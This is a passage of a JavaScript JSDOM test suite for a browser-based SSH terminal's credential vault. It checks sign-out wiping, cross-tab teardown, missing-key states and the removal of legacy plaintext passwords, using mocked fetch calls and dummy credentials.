    JSON.stringify({pX: {password: 'manual-pw'}}));
  // Capture every save_delete URL.
  const originalFetch = win.fetch;
  win.fetch = async (url, init) => {
    if (url.indexOf('save_delete') !== -1) deletes.push(url);
    return originalFetch(url, init);
  };
  win.openSignOutModal();
  $(win, 'signOutInput').value = 'DELETE';
  $(win, 'signOutInput').dispatchEvent(new win.Event('input', {bubbles: true}));
  await win.confirmSignOut();
  // Two DELETEs to the server (one per card), each with the right vault.
  ok(deletes.length === 2, 'two server DELETEs; got ' + deletes.length);
  ok(deletes.every(u => u.indexOf('vault_id=' + realVaultId) !== -1),
     'every DELETE used the correct vault_id');
  // localStorage saved list emptied.
  const list = JSON.parse(win.localStorage.getItem('websh_connections'));
  ok(Array.isArray(list) && list.length === 0,
     'saved-card list emptied; got ' + JSON.stringify(list));
  // sessionStorage pane-secrets removed.
  ok(win.sessionStorage.getItem('websh_panes_session') === null,
     'pane-secrets removed from sessionStorage');
  // IDB K + vault_id gone.
  const idbK = await win.eval('_idbGet("K")');
  ok(!idbK, 'IDB K wiped; got ' + idbK);
  const idbV = await win.eval('_idbGet("vault_id")');
  ok(!idbV, 'IDB vault_id wiped; got ' + idbV);
  // In-memory caches invalidated; renderSaved would now show empty,
  // and any subsequent ensureVaultId/Key would mint fresh values.
  const cache = win.eval('_idbHasKeyCache');
  ok(cache === false, '_idbHasKeyCache invalidated; got ' + cache);
  // Modal hidden.
  ok(hidden($(win, 'signOutModal')), 'sign-out modal closed');
  cleanup(env);
});

test('sign out: empty-vault path does NOT mint vault_id or broadcast', async () => {
  // Fresh tab, user clicks Sign Out without ever having signed in.
  // The old code called ensureVaultId() (minting) just to delete the
  // freshly-minted vault_id on the next line, and then unconditionally
  // _broadcastSignedOut() — telling sibling tabs (which may have a
  // live unrelated vault session) to invalidate caches and tear down
  // panes for nothing. The fix: ensureVaultIdIfPresent + preexisting
  // gate around the broadcast and pane teardown.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  let broadcasts = 0;
  const ChannelMock = class {
    constructor(name) { this.name = name; this.onmessage = null;
                        ChannelMock.instances.push(this); }
    postMessage(d) {
      broadcasts++;
      ChannelMock.instances.forEach(c => {
        if (c !== this && c.onmessage) c.onmessage({data: d});
      });
    }
    close() {}
  };
  ChannelMock.instances = [];
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                                url: 'http://localhost/websh/'});
  const win = dom.window;
  makeFakes(win);
  win.fetch = makeFetch(plan, []);
  _injectVaultGlobals(win);
  win.BroadcastChannel = ChannelMock;
  win.localStorage.clear();
  win.eval(js + EXPOSE);
  await sleep(40);
  // No ensureVaultId / ensureVaultKey calls — IDB stays empty.
  ok(!(await win.eval('_idbGet("vault_id")')),
     'vault_id empty pre-test');
  win.openSignOutModal();
  $(win, 'signOutInput').value = 'DELETE';
  $(win, 'signOutInput').dispatchEvent(new win.Event('input', {bubbles: true}));
  await win.confirmSignOut();
  // No broadcast — sibling tabs unbothered.
  ok(broadcasts === 0,
     'no broadcast on empty-vault sign-out; got ' + broadcasts);
  // No minted vault_id — IDB stays empty.
  ok(!(await win.eval('_idbGet("vault_id")')),
     'IDB vault_id still empty (no mint just to delete)');
  // Sign-out flag NOT set — would otherwise block legit saves in
  // sibling tabs until they re-doConnect.
  ok(win.eval('_vaultRecentlySignedOut') === false,
     '_vaultRecentlySignedOut NOT set on empty path');
  // Modal closed regardless — the user did click Sign Out.
  ok(hidden($(win, 'signOutModal')), 'sign-out modal closed');
  await closeDom(dom);
});

test('sign out: populated-vault path DOES broadcast to siblings', async () => {
  // Counter-test for the preexisting gate: when there was a vault to
  // sign out of, the broadcast and pane teardown must still fire.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}},
                {action: 'save_delete', response: () => ({})}];
  let broadcasts = 0;
  const ChannelMock = class {
    constructor(name) { this.name = name; this.onmessage = null;
                        ChannelMock.instances.push(this); }
    postMessage(d) {
      broadcasts++;
      ChannelMock.instances.forEach(c => {
        if (c !== this && c.onmessage) c.onmessage({data: d});
      });
    }
    close() {}
  };
  ChannelMock.instances = [];
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                                url: 'http://localhost/websh/'});
  const win = dom.window;
  makeFakes(win);
  win.fetch = makeFetch(plan, []);
  _injectVaultGlobals(win);
  win.BroadcastChannel = ChannelMock;
  win.localStorage.clear();
  win.eval(js + EXPOSE);
  await sleep(40);
  // Populate: mint vault_id + K, add a saved card so save_delete fires.
  await win.eval('ensureVaultId()');
  await win.eval('ensureVaultKey()');
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'A', conn_id: 'A'.repeat(26), host: 'a', port: 22, user: 'u',
     auth: 'pw', persistent: false}]));
  win.openSignOutModal();
  $(win, 'signOutInput').value = 'DELETE';
  $(win, 'signOutInput').dispatchEvent(new win.Event('input', {bubbles: true}));
  await win.confirmSignOut();
  ok(broadcasts === 1,
     'one broadcast on populated-vault sign-out; got ' + broadcasts);
  ok(win.eval('_vaultRecentlySignedOut') === true,
     '_vaultRecentlySignedOut SET on populated path');
  await closeDom(dom);
});

test('sign out: tolerates server-side failures (local wipe still happens)', async () => {
  let attempts = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'save_delete', response: () => { attempts++; throw new Error('boom'); }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  await win.eval('ensureVaultId()');
  await win.eval('ensureVaultKey()');
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'A', conn_id: 'A'.repeat(26), host: 'a', port: 22, user: 'u',
     auth: 'pw', persistent: false}]));
  win.openSignOutModal();
  $(win, 'signOutInput').value = 'DELETE';
  $(win, 'signOutInput').dispatchEvent(new win.Event('input', {bubbles: true}));
  await win.confirmSignOut();
  const list = JSON.parse(win.localStorage.getItem('websh_connections'));
  ok(list.length === 0, 'local list wiped despite server failure');
  const idbK = await win.eval('_idbGet("K")');
  ok(!idbK, 'IDB K wiped despite server failure');
  cleanup(env);
});

// =====================================================================
// Vault: no-key grayed state for orphan saved cards
// =====================================================================

test('no-key state: rendered when IDB lacks K but localStorage row survives', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  // Simulate the post-Safari-ITP / cleared-site-data scenario: vault
  // row in localStorage, no K in IDB. The cache defaults to false on
  // boot until _refreshIdbHasKey races in; loadServerConfig in mkEnv
  // already called it and it observed "no K" → false. So we can render
  // directly.
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'Orphan', conn_id: 'O'.repeat(26), host: 'o', port: 22,
     user: 'u', auth: 'pw', persistent: false}]));
  win.eval('renderSaved()');
  const row = win.document.querySelector('.sv');
  ok(row && row.classList.contains('nokey'),
     'row has .nokey class');
  ok(row.textContent.indexOf('no key') !== -1,
     'no-key tag shown in row text');
  cleanup(env);
});

test('two persistent panes to a long host never share a tmux slot', async () => {
  // Truncating user_host_port_rand to 64 chars cut the random suffix off
  // for a long hostname: every pane got the same slot, and the second
  // one attached to (and detached) the first one's shell.
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const host = 'build-server-01.eu-west.internal.corp.example-company.com';
  const ids = new Set();
  for (let i = 0; i < 50; i++) {
    const id = win.slotIdFor('root', host, 22);
    ok(/^[A-Za-z0-9_-]{1,64}$/.test(id), 'valid slot id: ' + id);
    ids.add(id);
  }
  ok(ids.size === 50, '50 panes, 50 slots; got ' + ids.size);
  ok(win.slotIdFor('u', 'h', 22).startsWith('u_h_22_'), 'short ones stay readable');
  cleanup(env);
});

test('config fetch failing at boot never makes a live vault card deletable', async () => {
  // The config-failure path rendered the saved list while the key cache
  // still held its declaration-time false: every vault card showed
  // "no key", and one click - meant to connect - deleted the credential
  // locally and on the server, although K was intact in IndexedDB.
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false,
                                                        connections: [], vault_enabled: true}}]);
  const win = env.win;
  await win.eval('_idbPut("K", new Uint8Array(32))');      // the key IS there
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'prod db', conn_id: 'P'.repeat(26), host: 'db', port: 22,
     user: 'u', auth: 'pw', persistent: false}]));
  // Boot again with /api/config unreachable.
  const log = [];
  win.fetch = (url) => {
    const a = new URL(url, 'http://x/').searchParams.get('action');
    log.push(a);
    return a === 'config' ? Promise.reject(new TypeError('Failed to fetch'))
                          : Promise.resolve({json: () => Promise.resolve({})});
  };
  win.eval('_idbHasKeyCache = false; loadServerConfig()');
  await sleep(80);
  const row = win.document.querySelector('.sv');
  ok(row && !row.classList.contains('nokey'), 'card painted with its real state');
  // Even if a stale render marks it, the click re-checks before deleting.
  win.eval('_idbHasKeyCache = false; renderSaved()');
  let connected = 0;
  win.connectSaved = () => { connected++; };
  win.document.querySelector('.sv').click();
  await sleep(40);
  ok(!log.includes('save_delete'), 'nothing deleted on the server; got ' + log);
  ok(JSON.parse(win.localStorage.getItem('websh_connections')).length === 1, 'card kept');
  ok(connected === 1, 'the click connects instead');
  cleanup(env);
});

test('no-key state: click on no-key row deletes (no /api/connect)', async () => {
  let connectCalls = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'save_delete', response: {}, once: true},
    {action: 'connect', response: () => { connectCalls++; return {alive: false}; }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Force ensureVaultId to materialise a vault_id so the bulk-delete
  // path can ship a meaningful query string.
  const realVaultId = await win.eval('ensureVaultId()');
  // Wipe K and re-sync the cache — simulates a Safari ITP eviction
  // where vault_id survives but K does not.
  await win.eval('_idbDelete("K")');
  win.eval('_vaultKeyCache = null;');
  await win.eval('_refreshIdbHasKey()');
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'Orphan', conn_id: 'O'.repeat(26), host: 'o', port: 22,
     user: 'u', auth: 'pw', persistent: false}]));
  win.eval('renderSaved()');
  // Intercept fetch to capture URL too — the plan matcher only sees
  // action, but we need the query string.
  const originalFetch = win.fetch;
  let capturedUrl = null;
  win.fetch = async (url, init) => {
    if (url.indexOf('save_delete') !== -1) capturedUrl = url;
    return originalFetch(url, init);
  };
  // Click the row (NOT the delete button) — no-key routes to delete.
  win.document.querySelector('.sv').click();
  await sleep(60);
  ok(connectCalls === 0, '/api/connect was NOT called; got ' + connectCalls);
  ok(capturedUrl && capturedUrl.indexOf('vault_id=' + realVaultId) !== -1,
     'save_delete URL carried the IDB-resident vault_id; got ' + capturedUrl);
  ok(capturedUrl && capturedUrl.indexOf('conn_id=' + 'O'.repeat(26)) !== -1,
     'save_delete URL carried the conn_id; got ' + capturedUrl);
  const list = JSON.parse(win.localStorage.getItem('websh_connections'));
  ok(list.length === 0, 'row removed from localStorage');
  cleanup(env);
});

test('no-key state: hasKey cache is true after a fresh save → not grayed', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-nk1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: {}, once: true},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Force the save path so ensureVaultKey runs and sets the cache.
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true;
  $(win, 'iName').value = 'Live';
  win.doConnect();
  await sleep(120);
  const p = paneList(win)[0];
  p.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p, {data: '', alive: true});
  await sleep(80);
  // _idbHasKeyCache should be true now.
  const cache = win.eval('_idbHasKeyCache');
  ok(cache === true, '_idbHasKeyCache true after save; got ' + cache);
  // Re-render and check the row is NOT grayed.
  win.eval('renderSaved()');
  const row = win.document.querySelector('.sv');
  ok(row && !row.classList.contains('nokey'),
     'live vault row not marked .nokey');
  cleanup(env);
});

// =====================================================================
// Vault: vault-key lifecycle — IfPresent guards (PR-67 review findings)
// =====================================================================

test('no-key F5: stale vault pane manifest does NOT mint a fresh K', async () => {
  let connectCalls = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: () => { connectCalls++; return {alive: false}; }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Seed: vault-backed pane manifest in localStorage, IDB is empty
  // (Safari ITP eviction / cleared-site-data / sign-out-in-other-tab).
  win.localStorage.setItem('websh_panes', JSON.stringify({
    version: 2,
    layout: {type: 'leaf', pane: 'v1', flex: ''},
    panes: {
      v1: {label: 'Stale', via: 'vault', conn_id: 'V'.repeat(26),
           host: 'h', port: 22, user: 'u', persistent: false,
           slot_id: null, tmux_cmd: 'tmux', cols: 80, rows: 24},
    },
  }));
  // Confirm baseline: IDB empty, cache false.
  ok((await win.eval('_idbGet("K")')) == null, 'baseline: IDB K is empty');
  ok(win.eval('_idbHasKeyCache') === false, 'baseline: _idbHasKeyCache false');
  // Drive the F5 restore explicitly (mkEnv boot's tryRestoreSessions
  // already ran against an empty manifest, so seeding-and-re-running is
  // the cleanest way to isolate this code path).
  const restored = win.eval('tryRestoreSessions()');
  ok(restored === true, 'tryRestoreSessions returned true; got ' + restored);
  // Let the async connectPane vault-branch run.
  await sleep(80);
  // The fix: vault-branch must NOT silently mint. Cache stays false,
  // IDB stays empty, no /api/connect was fired.
  ok(win.eval('_idbHasKeyCache') === false,
     '_idbHasKeyCache NOT flipped to true by stale-vault F5; got ' +
     win.eval('_idbHasKeyCache'));
  ok((await win.eval('_idbGet("K")')) == null,
     'IDB K NOT silently minted by stale-vault F5');
  ok((await win.eval('_idbGet("vault_id")')) == null,
     'IDB vault_id NOT silently minted by stale-vault F5');
  ok(connectCalls === 0,
     '/api/connect NOT called when vault key is missing; got ' + connectCalls);
  // The pane is rendered but disconnected, with the reconnect bar up.
  const ps = paneList(win);
  ok(ps.length === 1, 'pane rendered; got ' + ps.length);
  if (ps.length) {
    ok(!ps[0].sid, 'pane has no sid (connect bailed)');
    ok(!ps[0].connecting, 'pane.connecting cleared');
    const bar = ps[0].el.querySelector('[data-reconnect]');
    ok(bar && !bar.classList.contains('h'), 'reconnect bar visible');
    const msg = bar && bar.querySelector('span');
    ok(msg && msg.textContent.indexOf('Vault key missing') !== -1,
       'reconnect bar says "Vault key missing"; got=' +
       (msg && msg.textContent));
  }
  cleanup(env);
});

test('no-key F5: connectSaved on empty IDB skips /api/connect, no minting', async () => {
  let connectCalls = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: () => { connectCalls++; return {alive: false}; }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Saved card row exists in localStorage but IDB is empty.
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'Orphan', conn_id: 'O'.repeat(26), host: 'o', port: 22,
     user: 'u', auth: 'pw', persistent: false}]));
  // Call connectSaved directly (bypassing renderSaved's pre-gate).
  await win.connectSaved({name: 'Orphan', conn_id: 'O'.repeat(26),
                          host: 'o', port: 22, user: 'u',
                          auth: 'pw', persistent: false});
  await sleep(60);
  ok(connectCalls === 0,
     '/api/connect NOT called for no-key connectSaved; got ' + connectCalls);
  ok((await win.eval('_idbGet("K")')) == null,
     'IDB K NOT silently minted by connectSaved');
  ok((await win.eval('_idbGet("vault_id")')) == null,
     'IDB vault_id NOT silently minted by connectSaved');
  // User-visible toast acknowledges the missing key.
  const toasts = win.document.querySelectorAll('#toastHost .toast');
  ok(toasts.length >= 1, 'toast raised for no-key connectSaved; count=' +
     toasts.length);
  cleanup(env);
});

test('no-key F5: _bulkDeleteVaultEntry on empty IDB skips server call', async () => {
  let deleteCalls = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'save_delete', response: () => { deleteCalls++; return {}; }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // No IDB seed; jump straight into the bulk-delete path.
  await win._bulkDeleteVaultEntry({name: 'Orphan', conn_id: 'O'.repeat(26),
                                    host: 'o', port: 22, user: 'u',
                                    auth: 'pw', persistent: false});
  await sleep(40);
  ok(deleteCalls === 0,
     'save_delete NOT called when vault_id missing; got ' + deleteCalls);
  ok((await win.eval('_idbGet("vault_id")')) == null,
     'IDB vault_id NOT silently minted by _bulkDeleteVaultEntry');
  cleanup(env);
});

test('decryptCredentials on empty IDB throws no_vault_key', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  let threw = null;
  try {
    await win.decryptCredentials('AAAAAAAAAAAAAAAA', 'AAAAAAAAAAAAAAAA',
                                  'C'.repeat(26));
  } catch (e) { threw = e; }
  ok(threw && /no_vault_key/.test(threw.message),
     'decryptCredentials threw no_vault_key; got ' + (threw && threw.message));
  ok((await win.eval('_idbGet("K")')) == null,
     'IDB K NOT silently minted by decryptCredentials');
  cleanup(env);
});

test('sign out: live vault pane torn down + manifest filtered', async () => {
  // We need a live vault-backed pane plus a manual pane in the same
  // session so we can prove the manifest is FILTERED (vault row dropped,
  // manual row kept) rather than nuked wholesale.
  let disconnects = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: (body) => {
      // Distinguish manual vs. vault by body shape; return a unique sid.
      if (body && body.vault_id) return {session_id: 'sid-vault', alive: true};
      return {session_id: 'sid-manual', alive: true};
    }},
    {action: 'resize', response: {ok: true}},
    {action: 'save_delete', response: {}},
    {action: 'disconnect', response: () => { disconnects++; return {}; }},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // First: seed + click a vault card so we get a live vault pane.
  const {vault_id, conn_id} = await _seedVaultCard(win);
  win.document.querySelector('.sv').click();
  await sleep(120);
  // Confirm the vault pane is live.
  let panesArr = paneList(win);
  ok(panesArr.length === 1, 'vault pane materialized; got ' + panesArr.length);
  const vaultPaneId = panesArr[0].id;
  ok(panesArr[0].sid === 'sid-vault', 'vault pane has sid-vault sid');
  ok(panesArr[0].conn_id === conn_id, 'vault pane carries conn_id');
  // Persist manifest with the vault pane.
  win.eval('saveSessions()');
  // Now seed a manual pane manifest row alongside the vault row by
  // editing the manifest directly — driving the manual connect through
  // the UI would create a real second pane but also fire a real
  // /api/connect for it, which complicates assertions. The manifest-
  // filter test only needs the manifest to contain BOTH shapes.
  let raw = win.localStorage.getItem('websh_panes');
  ok(raw, 'manifest exists pre-signout');
  const pre = JSON.parse(raw);
  pre.panes['mManual'] = {
    label: 'Manual', via: 'manual', host: 'm.example.com', port: 22,
    user: 'u', auth: 'pw', persistent: false, slot_id: null,
    tmux_cmd: 'tmux', cols: 80, rows: 24,
  };
  // Wrap the layout into a split so both manifest keys are referenced.
  pre.layout = {type: 'split', dir: 'h', a: pre.layout,
                b: {type: 'leaf', pane: 'mManual', flex: ''}};
  win.localStorage.setItem('websh_panes', JSON.stringify(pre));
  // Sign out.
  win.openSignOutModal();
  $(win, 'signOutInput').value = 'DELETE';
  $(win, 'signOutInput').dispatchEvent(new win.Event('input', {bubbles: true}));
  await win.confirmSignOut();
  await sleep(40);
  // Manifest: vault entry filtered, manual kept.
  const post = JSON.parse(win.localStorage.getItem('websh_panes'));
  ok(post && post.panes, 'manifest still present after sign-out');
  ok(!(vaultPaneId in post.panes),
     'vault pane key dropped from manifest; got keys=' +
     Object.keys(post.panes).join(','));
  ok('mManual' in post.panes,
     'manual pane key kept in manifest; got keys=' +
     Object.keys(post.panes).join(','));
  // Live vault pane: stopped polling, sid cleared, reconnect bar up.
  const livePane = win.panes[vaultPaneId];
  ok(livePane, 'live vault pane DOM kept around for user to see');
  if (livePane) {
    ok(!livePane.sid, 'live vault pane sid cleared; got ' + livePane.sid);
    ok(!livePane.polling, 'live vault pane polling stopped');
    const bar = livePane.el.querySelector('[data-reconnect]');
    ok(bar && !bar.classList.contains('h'),
       'reconnect bar visible on torn-down vault pane');
    const msg = bar && bar.querySelector('span');
    ok(msg && msg.textContent.indexOf('Vault key missing') !== -1,
       'torn-down vault pane shows "Vault key missing"; got=' +
       (msg && msg.textContent));
  }
  // /api/disconnect was fired for the vault pane.
  ok(disconnects === 1,
     'one /api/disconnect for the torn-down vault pane; got ' + disconnects);
  cleanup(env);
});

test('cross-tab signed_out tears down live vault panes in sibling tab', async () => {
  // Boot with a BroadcastChannel shim so this tab listens for sibling
  // signed_out broadcasts. The cross-tab fix: invalidating the cache
  // alone leaves any live vault pane streaming on with a key that's
  // been nuked from disk — Finding 3 in the PR-67 review.
  let disconnects = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-xt', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'disconnect', response: () => { disconnects++; return {}; }},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const ChannelMock = class {
    constructor(name) {
      this.name = name; ChannelMock.instances.push(this); this.onmessage = null;
    }
    postMessage(d) {
      ChannelMock.instances.forEach(c => {
        if (c !== this && c.onmessage) c.onmessage({data: d});
      });
    }
    close() {}
  };
  ChannelMock.instances = [];
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                                url: 'http://localhost/websh/'});
  const win = dom.window;
  const log = [];
  makeFakes(win);
  win.fetch = makeFetch(plan, log);
  _injectVaultGlobals(win);
  win.BroadcastChannel = ChannelMock;
  win.localStorage.clear();
  win.eval(js + EXPOSE);
  await sleep(30);
  // Live vault pane: seed + click.
  const {conn_id} = await _seedVaultCard(win);
  win.document.querySelector('.sv').click();
  await sleep(120);
  const panesArr = Object.values(win.panes);
  ok(panesArr.length === 1, 'live vault pane created');
  const livePane = panesArr[0];
  ok(livePane.sid === 'sid-xt', 'live vault pane has sid');
  ok(livePane.conn_id === conn_id, 'live vault pane carries conn_id');
  // Sibling tab fires signed_out.
  const sibling = new ChannelMock('websh_vault');
  sibling.postMessage({type: 'signed_out'});
  await sleep(40);
  // Live vault pane torn down: sid cleared, reconnect bar up, server
  // got a /api/disconnect.
  ok(!livePane.sid,
     'live vault pane sid cleared by cross-tab signed_out; got ' + livePane.sid);
  ok(!livePane.polling, 'live vault pane polling stopped');
  const bar = livePane.el.querySelector('[data-reconnect]');
  ok(bar && !bar.classList.contains('h'),
     'reconnect bar visible after cross-tab signed_out');
  const msg = bar && bar.querySelector('span');
  ok(msg && msg.textContent.indexOf('Vault key missing') !== -1,
     'reconnect bar says "Vault key missing"; got=' +
     (msg && msg.textContent));
  ok(disconnects === 1,
     'one /api/disconnect fired by cross-tab teardown; got ' + disconnects);
  // Cache invalidated — _idbHasKeyCache false (no minting in handler).
  ok(win.eval('_idbHasKeyCache') === false,
     '_idbHasKeyCache invalidated after cross-tab signed_out');
  await closeDom(dom);
});

// =====================================================================
// Vault: legacy-plaintext banner
// =====================================================================

test('legacy auto-drop: no plaintext rows → modal stays hidden, list untouched', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  // Empty list at boot. loadServerConfig already ran via mkEnv.
  ok(hidden($(win, 'legacyUpdateModal')),
     'modal hidden by default with empty saved list');
  // Vault-only row — should not trigger drop or modal.
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'Vaulted', conn_id: 'V'.repeat(26), host: 'v', port: 22,
     user: 'u', auth: 'pw', persistent: false}]));
  win.eval('_maybeAutoDropLegacy()');
  ok(hidden($(win, 'legacyUpdateModal')),
     'modal stays hidden for vault-only row');
  const list = JSON.parse(win.localStorage.getItem('websh_connections'));
  ok(list.length === 1 && list[0].conn_id === 'V'.repeat(26),
     'vault row untouched');
  cleanup(env);
});

test('legacy auto-drop: pass/key stripped automatically + modal shown', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  // Pre-seed legacy rows BEFORE loadServerConfig fires — easiest way
  // is to set localStorage and re-call _maybeAutoDropLegacy directly
  // (mkEnv already finished its boot).
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'OldProd', host: 'p', port: 22, user: 'u', pass: 'oldpw',
     persistent: true},
    {name: 'OldKey',  host: 'k', port: 22, user: 'r',
     key: '-----BEGIN OPENSSH PRIVATE KEY-----...'},
    {name: 'Already', conn_id: 'A'.repeat(26), host: 'a', port: 22,
     user: 'a', auth: 'pw', persistent: false}]));
  win.eval('_maybeAutoDropLegacy()');
  ok(!hidden($(win, 'legacyUpdateModal')),
     'modal shown because legacy rows were dropped');
  const list = JSON.parse(win.localStorage.getItem('websh_connections'));
  ok(list.length === 3, 'all rows kept (metadata-only)');
  ok(!('pass' in list[0]) && !('key' in list[0]),
     'OldProd: pass dropped');
  ok(list[0].name === 'OldProd' && list[0].host === 'p' &&
     list[0].user === 'u' && list[0].persistent === true,
     'OldProd: metadata kept');
  ok(!('pass' in list[1]) && !('key' in list[1]),
     'OldKey: key dropped');
  ok(list[1].name === 'OldKey' && list[1].user === 'r',
     'OldKey: metadata kept');
  ok(list[2].conn_id === 'A'.repeat(26),
     'vault-backed row untouched');
  // Re-running auto-drop is a no-op (no more legacy).
  win.eval('closeLegacyUpdateModal()');
  ok(hidden($(win, 'legacyUpdateModal')), 'modal closed by close fn');
  win.eval('_maybeAutoDropLegacy()');
  ok(hidden($(win, 'legacyUpdateModal')),
     'second auto-drop call is a no-op — modal stays hidden');
  cleanup(env);
});

test('legacy auto-drop: post-drop click opens form pre-filled, no /api/connect', async () => {
  // After auto-drop strips c.pass / c.key, clicking the saved card
  // must NOT fire /api/connect with empty creds (which the server
  // would auth-fail). Instead the connect form opens with the saved
  // metadata pre-filled, focus on the password input.
  let connectCalls = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: () => { connectCalls++; return {auth_failed: true}; }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Seed a legacy row that has just been auto-dropped (no pass, no key,
  // no conn_id — metadata only).
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'OldProd', host: '10.0.0.42', port: 22, user: 'deploy',
     auth: 'pw', persistent: true}]));
  win.eval('renderSaved()');
  win.document.querySelector('.sv').click();
  await sleep(40);
  ok(connectCalls === 0, 'no /api/connect with empty creds; got ' + connectCalls);
  ok(!hidden($(win, 'ov')), 'connect form opened');
  ok($(win, 'iH').value === '10.0.0.42', 'host pre-filled');
  ok($(win, 'iP').value == 22, 'port pre-filled');
  ok($(win, 'iU').value === 'deploy', 'user pre-filled');
  ok($(win, 'iName').value === 'OldProd', 'name pre-filled');
  ok($(win, 'iSave').checked === true, 'Save pre-checked (re-save under vault)');
  ok($(win, 'iPersistent').checked === true, 'persistent pre-checked from row');
  ok($(win, 'iPw').value === '', 'password field empty — user types');
  cleanup(env);
});

test('legacy auto-drop: post-drop click routes through named prompt connection', async () => {
  // The classic case: a legacy saved row that points at a named
  // prompt connection ("hetzner-hel"). After auto-drop the row has
  // no pass; clicking it must route through selectPromptConnection
  // so a restrict_hosts deployment still accepts the connect.
  let connectCalls = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: true, vault_enabled: true,
      connections: [{name: 'hh', host: 'h.example.com', port: 22,
                     username: '', kind: 'prompt'}]}},
    {action: 'connect', response: () => { connectCalls++; return {auth_failed: true}; }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'HH', host: 'h.example.com', port: 22, user: 'deploy',
     connection: 'hh', auth: 'pw', persistent: true}]));
  win.eval('renderSaved()');
  // Target the saved-list .sv specifically; #serverList also uses .sv
  // for prompt server-connection cards and appears first in the DOM.
  win.document.querySelector('#savedList .sv').click();
  await sleep(40);
  ok(connectCalls === 0, 'no /api/connect with empty creds; got ' + connectCalls);
  ok(!hidden($(win, 'ov')), 'connect form opened');
  // selectPromptConnection locks host/port and sets the prompt-target banner.
  ok($(win, 'iH').disabled === true, 'host locked by prompt connection');
  ok(!hidden($(win, 'promptTarget')), 'prompt-target banner shown');
  ok($(win, 'iU').value === 'deploy', 'user pre-filled from saved row');
  cleanup(env);
});

test('reconnect-bar: inline password input shown when manual pane has no creds', async () => {
  // Manual / named pane that lost its in-memory password (auth failed
  // after empty creds, fresh-tab F5 with empty sessionStorage, etc).
  // The reconnect bar exposes an inline password input so the user can
  // recover in place without opening the connect form.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sid-rb', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Materialize a real pane via the connect flow.
  $(win, 'iH').value = '10.0.0.50'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p1';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  ok(p, 'pane materialized');
  // Simulate a disconnect that lost creds (drop p.password) and trigger
  // the bar via showReconnectBar.
  p.password = '';
  win.eval(`showReconnectBar(panes['${p.id}'], 'auth_failed')`);
  await sleep(20);
  const bar = p.el.querySelector('[data-reconnect]');
  ok(!bar.classList.contains('h'), 'bar visible');
  const pwInput = bar.querySelector('input[type=password]');
  ok(pwInput, 'password input present');
